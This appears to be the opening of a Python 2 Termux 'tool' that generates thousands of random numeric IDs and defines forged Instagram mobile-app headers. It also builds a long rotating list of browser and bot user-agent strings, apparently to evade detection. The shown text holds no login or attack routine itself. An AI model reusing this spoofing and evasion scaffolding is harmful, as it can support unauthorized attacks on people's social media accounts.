#!/usr/bin/python2
#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(4500):

    MG = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(MG)

    sys.stdout.flush()
    
try:
    import os,sys,time,random,threading,json,mechanize,uuid,requests
    
    from uuid import uuid4
    
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('pip2 install requests')
    time.sleep(1)
    os.system('python2 API.py')
    
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')

#########(1)#########

A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"

#########(2)#########
TB = """ 
   \033[1;92m  _________ __      ___                
   \033[1;97m /   _____/|__|  __| _/_______ _____   
   \033[1;97m \_____  \ |  | / __ | \_  __ \\__  \  
   \033[1;97m /        \|  |/ /_/ |  |  | \/ / __ \_
   \033[1;97m/_______  /|__|\____ |  |__|   (____  /
   \033[1;92m        \/          \/              \/   

\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 

BT ="""

      \033[1;92m       d8888   8888888b.   8888888 
      \033[1;97m      d88888   888   Y88b    888   
      \033[1;92m     d88P888   888    888    888   
      \033[1;97m    d88P 888   888   d88P    888   
      \033[1;92m   d88P  888   8888888P"     888   
      \033[1;97m  d88P   888   888           888   
      \033[1;92m d8888888888   888           888   
      \033[1;97md88P     888   888         8888888 

\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ                                                    
"""                               

#########(3)#########


server=[]
     
API = {

"hadres" : {
'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
'Accept':'*/*', 
'Cookie':'missing', 
'Accept-Encoding':'gzip, deflate', 
'Accept-Language':'en-US', 
'X-IG-Capabilities':'3brTvw==', 
'X-IG-Connection-Type':'WIFI', 
'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
'Host':'i.instagram.com'
                }
,

"Headers" : {
 "content-type" : "application/json",
  "User-agent" : "",
		                             }
		
		}

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
#########(4)#########
def vpn():
    global server
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    server.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    server.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    server.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    server.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    server.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    server.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    server.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    server.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    server.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    server.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    server.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    server.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    server.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    server.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    server.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    server.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    server.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    server.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    server.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    server.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    server.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    server.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    server.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    server.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    server.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    server.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    server.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    server.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    server.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    server.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    server.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    server.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    server.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    server.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    server.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    server.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    server.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
    server.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
    server.append('Mozilla/4.0 (compatible; Arachmo)')
    server.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
    server.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    server.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    server.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
    server.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
    server.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
    server.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
    server.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    server.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    server.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
    server.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
    server.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
    server.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
    server.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
    server.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
    server.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
    server.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
    server.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
    server.append('SiteBar/3.3.8 (Bookmark server; http://sitebar.org/)')
    server.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    server.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    server.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
    server.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    server.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    server.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    server.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
